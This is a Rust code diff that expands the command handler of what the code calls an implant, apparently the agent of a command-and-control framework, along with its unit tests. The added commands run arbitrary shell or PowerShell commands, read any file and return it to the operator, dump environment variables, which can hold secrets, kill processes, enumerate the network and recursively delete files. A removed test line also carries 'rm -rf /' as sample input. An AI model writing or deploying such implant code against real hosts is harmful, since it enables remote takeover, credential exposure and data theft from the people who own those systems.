@@ -129,10 +129,30 @@ pub fn run_command(task: &Task, implant_id: Uuid) -> TaskResult {
         "pwd" => cmd_pwd(&task.args),
         "ls" => cmd_ls(&task.args),
         "cat" => cmd_cat(&task.args),
+        "cd" => cmd_cd(&task.args),
+        "mkdir" => cmd_mkdir(&task.args),
+        "rm" => cmd_rm(&task.args),
+        "mv" => cmd_mv(&task.args),
+        "cp" => cmd_cp(&task.args),
+        "touch" => cmd_touch(&task.args),
+        "download" => cmd_download(&task.args),
         "systeminfo" => cmd_systeminfo(&task.args),
+        "whoami" => cmd_whoami(&task.args),
+        "env" => cmd_env(&task.args),
+        "ps" => cmd_ps(&task.args),
+        "kill" => cmd_kill(&task.args),
+        "sleep" => cmd_sleep(&task.args),
+        "netstat" => cmd_netstat(&task.args),
+        "ipconfig" => cmd_ipconfig(&task.args),
+        "shell" => cmd_shell(&task.args),
         other => Err(format!(
-            "Unknown command '{}'. Supported commands: pwd, ls, cat, systeminfo",
-            other
+            "Unknown command '{}'. Supported commands: {}",
+            other,
+            rb::command::implant_cmds::IMPLANT_COMMANDS
+                .iter()
+                .map(|command| command.name)
+                .collect::<Vec<_>>()
+                .join(", ")
         )),
     };
 
@@ -233,6 +253,214 @@ fn format_time(time: SystemTime) -> String {
     }
 }
 
+fn arg(args: &[String], index: usize, usage: &str) -> Result<String, String> {
+    args.get(index).cloned().ok_or_else(|| format!("usage: {}", usage))
+}
+
+fn home_dir() -> Option<String> {
+    std::env::var("HOME")
+        .ok()
+        .or_else(|| std::env::var("USERPROFILE").ok())
+}
+
+/// Run an OS tool and return its combined output as text.
+fn run_tool(program: &str, arguments: &[&str]) -> Result<CommandOutput, String> {
+    let output = std::process::Command::new(program)
+        .args(arguments)
+        .output()
+        .map_err(|e| format!("failed to run {}: {}", program, e))?;
+
+    let mut text = String::from_utf8_lossy(&output.stdout).to_string();
+    text.push_str(&String::from_utf8_lossy(&output.stderr));
+    Ok(CommandOutput::Text(text))
+}
+
+fn command_exists(program: &str) -> bool {
+    std::process::Command::new(program)
+        .arg("--version")
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status()
+        .is_ok()
+}
+
+fn split_recursive_flag(args: &[String]) -> (bool, Vec<String>) {
+    let mut recursive = false;
+    let mut paths = Vec::new();
+    for argument in args {
+        if argument == "-r" || argument == "--recursive" {
+            recursive = true;
+        } else {
+            paths.push(argument.clone());
+        }
+    }
+    (recursive, paths)
+}
+
+fn cmd_cd(args: &[String]) -> Result<CommandOutput, String> {
+    let target = match args.first() {
+        Some(path) => path.clone(),
+        None => home_dir().ok_or_else(|| "usage: cd <path>".to_string())?,
+    };
+    std::env::set_current_dir(&target).map_err(|e| format!("{}: {}", target, e))?;
+    let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
+    Ok(CommandOutput::Text(cwd.display().to_string()))
+}
+
+fn cmd_mkdir(args: &[String]) -> Result<CommandOutput, String> {
+    let path = arg(args, 0, "mkdir <dir>")?;
+    std::fs::create_dir_all(&path).map_err(|e| format!("{}: {}", path, e))?;
+    Ok(CommandOutput::Text(format!("created {}", path)))
+}
+
+fn cmd_touch(args: &[String]) -> Result<CommandOutput, String> {
+    let path = arg(args, 0, "touch <file>")?;
+    std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&path)
+        .map_err(|e| format!("{}: {}", path, e))?;
+    Ok(CommandOutput::Text(format!("touched {}", path)))
+}
+
+fn cmd_rm(args: &[String]) -> Result<CommandOutput, String> {
+    let (recursive, paths) = split_recursive_flag(args);
+    let path = paths
+        .first()
+        .ok_or_else(|| "usage: rm [-r] <path>".to_string())?;
+
+    let metadata = std::fs::symlink_metadata(path).map_err(|e| format!("{}: {}", path, e))?;
+    if metadata.is_dir() {
+        if !recursive {
+            return Err(format!("{} is a directory (use -r)", path));
+        }
+        std::fs::remove_dir_all(path).map_err(|e| format!("{}: {}", path, e))?;
+    } else {
+        std::fs::remove_file(path).map_err(|e| format!("{}: {}", path, e))?;
+    }
+    Ok(CommandOutput::Text(format!("removed {}", path)))
+}
+
+fn cmd_mv(args: &[String]) -> Result<CommandOutput, String> {
+    if args.len() < 2 {
+        return Err("usage: mv <src> <dst>".to_string());
+    }
+    let (src, dst) = (&args[0], &args[1]);
+    std::fs::rename(src, dst).map_err(|e| format!("{} -> {}: {}", src, dst, e))?;
+    Ok(CommandOutput::Text(format!("moved {} to {}", src, dst)))
+}
+
+fn cmd_cp(args: &[String]) -> Result<CommandOutput, String> {
+    let (recursive, paths) = split_recursive_flag(args);
+    if paths.len() < 2 {
+        return Err("usage: cp [-r] <src> <dst>".to_string());
+    }
+    let (src, dst) = (&paths[0], &paths[1]);
+
+    let metadata = std::fs::metadata(src).map_err(|e| format!("{}: {}", src, e))?;
+    if metadata.is_dir() {
+        if !recursive {
+            return Err(format!("{} is a directory (use -r)", src));
+        }
+        copy_dir(src, dst).map_err(|e| format!("{} -> {}: {}", src, dst, e))?;
+    } else {
+        std::fs::copy(src, dst).map_err(|e| format!("{} -> {}: {}", src, dst, e))?;
+    }
+    Ok(CommandOutput::Text(format!("copied {} to {}", src, dst)))
+}
+
+fn copy_dir(src: &str, dst: &str) -> std::io::Result<()> {
+    std::fs::create_dir_all(dst)?;
+    for entry in std::fs::read_dir(src)? {
+        let entry = entry?;
+        let target = std::path::Path::new(dst).join(entry.file_name());
+        if entry.file_type()?.is_dir() {
+            copy_dir(&entry.path().to_string_lossy(), &target.to_string_lossy())?;
+        } else {
+            std::fs::copy(entry.path(), &target)?;
+        }
+    }
+    Ok(())
+}
+
+fn cmd_download(args: &[String]) -> Result<CommandOutput, String> {
+    let path = arg(args, 0, "download <file>")?;
+    let data = std::fs::read(&path).map_err(|e| format!("{}: {}", path, e))?;
+    let name = std::path::Path::new(&path)
+        .file_name()
+        .map(|n| n.to_string_lossy().to_string())
+        .unwrap_or_else(|| "download.bin".to_string());
+    Ok(CommandOutput::File { name, data })
+}
+
+fn cmd_whoami(_args: &[String]) -> Result<CommandOutput, String> {
+    Ok(CommandOutput::Text(whoami::username()))
+}
+
+fn cmd_env(_args: &[String]) -> Result<CommandOutput, String> {
+    let headers = vec!["Name".to_string(), "Value".to_string()];
+    let mut rows: Vec<Vec<String>> = std::env::vars().map(|(k, v)| vec![k, v]).collect();
+    rows.sort_by(|a, b| a[0].cmp(&b[0]));
+    Ok(CommandOutput::Table { headers, rows })
+}
+
+fn cmd_sleep(args: &[String]) -> Result<CommandOutput, String> {
+    let seconds: u64 = args
+        .first()
+        .ok_or_else(|| "usage: sleep <seconds>".to_string())?
+        .parse()
+        .map_err(|_| "sleep: seconds must be a number".to_string())?;
+    std::thread::sleep(std::time::Duration::from_secs(seconds));
+    Ok(CommandOutput::Text(format!("slept {}s", seconds)))
+}
+
+fn cmd_shell(args: &[String]) -> Result<CommandOutput, String> {
+    if args.is_empty() {
+        return Err("usage: shell <command>".to_string());
+    }
+    let command = args.join(" ");
+    if cfg!(target_os = "windows") {
+        run_tool("powershell", &["-NoProfile", "-Command", command.as_str()])
+    } else {
+        run_tool("sh", &["-c", command.as_str()])
+    }
+}
+
+fn cmd_ps(_args: &[String]) -> Result<CommandOutput, String> {
+    if cfg!(target_os = "windows") {
+        run_tool("tasklist", &[])
+    } else {
+        run_tool("ps", &["aux"])
+    }
+}
+
+fn cmd_kill(args: &[String]) -> Result<CommandOutput, String> {
+    let pid = arg(args, 0, "kill <pid>")?;
+    if cfg!(target_os = "windows") {
+        run_tool("taskkill", &["/PID", pid.as_str(), "/F"])
+    } else {
+        run_tool("kill", &["-9", pid.as_str()])
+    }
+}
+
+fn cmd_netstat(_args: &[String]) -> Result<CommandOutput, String> {
+    if cfg!(target_os = "windows") {
+        run_tool("netstat", &["-ano"])
+    } else if command_exists("ss") {
+        run_tool("ss", &["-tunapl"])
+    } else {
+        run_tool("netstat", &["-tunap"])
+    }
+}
+
+fn cmd_ipconfig(_args: &[String]) -> Result<CommandOutput, String> {
+    if cfg!(target_os = "windows") {
+        run_tool("ipconfig", &["/all"])
+    } else {
+        run_tool("ip", &["addr"])
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -295,12 +523,94 @@ mod tests {
 
     #[test]
     fn unknown_command_fails() {
-        let task = task("rm", &["-rf", "/"]);
+        let task = task("frobnicate", &[]);
         let result = run_command(&task, task.implant_id);
         assert_eq!(result.status, TaskStatus::Failed);
         assert!(result
             .error
             .unwrap_or_default()
             .contains("Unknown command"));
+    }
+
+    #[test]
+    fn cd_changes_directory() {
+        let dir = std::env::temp_dir().join(format!("rb_cd_{}", Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let original = std::env::current_dir().unwrap();
+
+        assert!(cmd_cd(&[dir.display().to_string()]).is_ok());
+        assert_eq!(std::env::current_dir().unwrap(), std::fs::canonicalize(&dir).unwrap());
+
+        std::env::set_current_dir(&original).unwrap();
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn file_management_round_trip() {
+        let dir = std::env::temp_dir().join(format!("rb_fs_{}", Uuid::new_v4()));
+        let root = dir.to_string_lossy().to_string();
+
+        cmd_mkdir(&[format!("{}/sub", root)]).unwrap();
+
+        let file = format!("{}/sub/a.txt", root);
+        cmd_touch(&[file.clone()]).unwrap();
+        std::fs::write(&file, b"data").unwrap();
+
+        let copy = format!("{}/sub/b.txt", root);
+        cmd_cp(&[file.clone(), copy.clone()]).unwrap();
+        assert_eq!(std::fs::read_to_string(&copy).unwrap(), "data");
+
+        let dir_copy = format!("{}/sub_copy", root);
+        cmd_cp(&["-r".to_string(), format!("{}/sub", root), dir_copy.clone()]).unwrap();
+        assert!(std::path::Path::new(&dir_copy).join("a.txt").exists());
+
+        let moved = format!("{}/moved.txt", root);
+        cmd_mv(&[copy.clone(), moved.clone()]).unwrap();
+        assert!(std::path::Path::new(&moved).exists());
+
+        match cmd_download(&[file.clone()]).unwrap() {
+            CommandOutput::File { name, data } => {
+                assert_eq!(name, "a.txt");
+                assert_eq!(data, b"data");
+            }
+            _ => panic!("expected file output"),
+        }
+
+        cmd_rm(&[file.clone()]).unwrap();
+        assert!(!std::path::Path::new(&file).exists());
+
+        cmd_rm(&["-r".to_string(), root.clone()]).unwrap();
+        assert!(!std::path::Path::new(&root).exists());
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn env_lists_variables() {
+        match cmd_env(&[]).unwrap() {
+            CommandOutput::Table { rows, .. } => assert!(!rows.is_empty()),
+            _ => panic!("expected table output"),
+        }
+    }
+
+    #[test]
+    fn whoami_is_text() {
+        match cmd_whoami(&[]).unwrap() {
+            CommandOutput::Text(text) => assert!(!text.is_empty()),
+            _ => panic!("expected text output"),
+        }
+    }
+
+    #[test]
+    fn shell_runs_a_command() {
+        match cmd_shell(&["echo".to_string(), "implant".to_string()]).unwrap() {
+            CommandOutput::Text(text) => assert!(text.contains("implant")),
+            _ => panic!("expected text output"),
+        }
+    }
+
+    #[test]
+    fn sleep_zero_succeeds() {
+        assert!(cmd_sleep(&["0".to_string()]).is_ok());
     }
 }
